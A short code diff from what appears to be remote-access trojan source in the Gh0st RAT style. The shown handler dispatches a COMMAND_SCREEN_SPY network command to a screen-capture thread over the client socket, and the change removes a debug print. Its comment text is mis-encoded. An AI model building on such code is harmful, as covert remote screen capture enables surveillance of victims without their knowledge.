@@ -60,7 +60,6 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	//		(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 	//	break;
 	case COMMAND_SCREEN_SPY: // ÆÁÄ»²é¿´
-		OutputDebugStringA("COMMAND_SCREEN_SPY");
  		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
  			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
 		break;
